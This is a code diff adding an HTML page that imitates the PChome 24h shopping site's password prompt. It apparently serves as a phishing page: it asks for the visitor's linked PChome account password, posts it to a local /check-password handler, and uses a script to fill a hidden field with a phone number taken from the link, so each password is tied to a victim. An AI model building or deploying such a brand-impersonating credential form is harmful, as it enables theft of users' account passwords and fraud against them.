@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PChome 24h購物</title>
+    <script src="https://kit.fontawesome.com/231e09f1bf.js" crossorigin="anonymous"></script>
+    <style>
+        html,body {
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0
+        }
+        #header {
+            width: 100%;
+            margin-bottom: 10px;
+            background-color: #fff;
+        }
+        .login-container #header {
+            margin-bottom: 0;
+        }
+
+        .login-container .top-header {
+            max-width: 1240px;
+            width: auto;
+        }
+        .top-header {
+            margin: 0 auto;
+            padding: 0 5px;
+
+        }
+        .middle {
+            color: #555;
+            font: 15px Arial;
+        }
+        .logotype {
+            background: url('https://fs-f.ecimg.tw/img/h24/new/index/v1/images/logo/logo_pchome.svg') no-repeat;
+            background-size: contain;
+            text-indent: -9999px;
+        }
+        .middle>a {
+            padding: 0 5px;
+            font: 12px/35px Verdana;
+            color:#999;
+        }
+        .middle>a:before {
+            content: '';
+            display: inline-block;
+            padding-right: 3px;
+            border-style: solid;
+            border-width: 4px 0 4px 5px;
+            border-color: transparent #7fc7e9;
+        }
+        .login-container .middle {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+
+        }
+        .login-container .logotype {
+            width: 200px;
+            height: 28px;
+            margin: 16px 0;
+        }
+        .login-container .middle-wrapper {
+            background-color: #F2F2F2;
+        }
+        .login-container .login-center {
+            padding: 48px 0;
+            min-height: calc(100vh - 212px);
+        }
+        .login-wrapper {
+            margin: auto;
+            padding: 24px;
+            max-width: 450px;
+            font-family: "Noto Sans TC","Montserrat","Roboto",Helvetica,Arial,sans-serif;
+            font-size: 14px;
+            border-radius: 8px;
+            background-color: #fff;
+            line-height: 1.5;
+        }
+        .login-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center
+        }
+        .login-welcome {
+            font-size: 22px;
+            font-weight: 700
+        }
+        .login-sign {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            margin-top: 8px;
+        }
+
+        .login-sign .login-link {
+            font-weight: 1000;
+            margin-left: 4px
+        }
+        .login-sign-pw {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            margin-top: 8px;
+        }
+
+        .login-sign-pw .login-link-pw {
+            font-size: 15px;
+            font-weight: 1000;
+            margin-left: 4px;
+            margin-top: 20px;
+        }
+
+        /* content*/
+        .login-content {
+            margin: 24px 0
+        }
+
+        /*input*/
+        .login-input {
+            margin-bottom: 20px; /* 調整上下間距 */
+        }
+
+        .login-input-text input[type="text"] {
+            width: 95%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .login-input-text input[type="text"]:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+        .login-input-pw {
+            position: relative;
+        }
+
+        .login-input-pw input[type="password"] {
+            width: 95%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .login-input-pw input[type="password"]:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+
+        .login-input-pw-check input[type="password"] {
+            width: 95%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .login-input-pw-check input[type="password"]:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+
+        .checkbox input {
+            margin: 0;
+            width: 20px;
+            height: 20px;
+            opacity: 0;
+            position: absolute;
+            z-index: 1;
+            cursor: pointer
+        }
+
+
+        /*buttom*/
+        .login-btn {
+            margin-top: 24px;
+        }
+
+
+        .l-btn{
+            border: none;
+            cursor: pointer;
+            font-family: Noto Sans TC, Montserrat, Roboto, Helvetica, Arial, sans-serif;
+            font-weight: 500;
+            line-height: 1.5;
+            outline: none;
+            text-align: center;
+            vertical-align: middle;
+            background-color: #ea1717;
+            color: #fff;
+            border-radius: 8px;
+            font-size: 16px;
+            padding: 8px;
+            width: 100%;
+        }
+
+
+        a {
+            color: #0090EB;
+            text-decoration: none;
+        }
+
+        .box-loginBtn img {
+            width: 52px;
+            height: 52px;
+            border-radius: 10px;
+        }
+
+        .footer-container a{
+            text-decoration: underline;
+            color: #333;
+            font-size: 13px;
+
+        }
+        .footer-container p{
+            font: 12px / 1.5 Arial;
+            color: #333;
+            line-height: 0.5;
+        }
+    </style>
+</head>
+<body>
+
+
+<div id="container" class="login-container">
+    <div id="header">
+        <div class="top-header">
+            <div class="middle">
+                <h1 class="logotype"><a href="https://24h.pchome.com.tw">PChome 24h購物</a></h1>
+                <a href="https://24h.pchome.com.tw">回PChome 24h購物首頁</a>
+            </div>
+        </div>
+    </div>
+    <div class="middle-wrapper">
+        <div class="login-center">
+            <div class="login-block">
+                <div class="login-wrapper">
+                    <div class="login-header">
+                        <div class="login-welcome">請輸入您的密碼</div>
+                        <div class="login-sign">
+                            <div class="login-info">
+                                請輸入連結的PChome 24h購物帳號密碼
+                            </div>
+
+                        </div>
+                    </div>
+                    <div class="login-content">
+                        <form method="post" action="/check-password">
+
+                            <div class="login-input">
+
+                                <div class="login-input-pw">
+                                    <input type="hidden" id="phone" name="phone">
+                                    <input id="re-pw" type="password" name="password" placeholder="請輸入密碼（英文大小寫有差別）" tabindex="0" maxlength="30" />
+                                </div>
+
+                            </div>
+
+
+                            <div class="login-btn">
+
+                                <button id="btnKeep" class="l-btn" type="submit">
+                                    <span>登入</span>
+                                </button>
+                            </div>
+                            <div class="login-sign-pw">
+                                <a href="#" class="login-link-pw">忘記密碼</a>
+                            </div>
+                        </form>
+
+
+                    </div>
+
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+</div>
+<script>
+   
+    function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        const phone = getQueryParam('phone');
+        document.getElementById('phone').value = phone;
+    });
+</script>
+</body>
+</html>
